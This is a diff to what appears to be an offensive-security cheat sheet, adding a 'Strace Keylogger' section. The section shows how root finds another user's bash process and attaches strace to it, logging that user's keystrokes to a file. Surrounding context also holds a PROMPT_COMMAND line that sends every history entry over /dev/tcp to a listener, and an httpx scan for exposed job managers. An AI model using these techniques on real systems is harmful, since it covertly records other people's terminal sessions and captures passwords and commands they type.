@@ -157,6 +157,28 @@ cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/lo
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
 
+## Strace Keylogger:
+
+```
+root@rosesecurity:~# ps aux | grep bash
+rick      3103  0.0  0.6   6140  3392 pts/0    Ss+  17:14   0:00 bash
+root      3199  0.0  0.6   6140  3540 pts/1    Ss   17:18   0:00 bash
+root      3373  0.0  0.1   3488   768 pts/1    S+   18:06   0:00 grep bash
+```
+Strace Options:
+
+1. –p 3103: connect to PID 3103, which above is on pts/0
+2. –t : print the time of day
+3. –e write: only capture write calls
+4. –q : be quiet
+5. –f : follow any fork (created) process
+6. –o keylogger.txt: output the results to a file named keylogger.txt
+
+```
+root@securitynik:~# strace -p 3103 -t -e write -q -f -o keylogger.txt &
+[1] 3432
+```
+
 ## Netcat UDP Scanner:
 
 ```
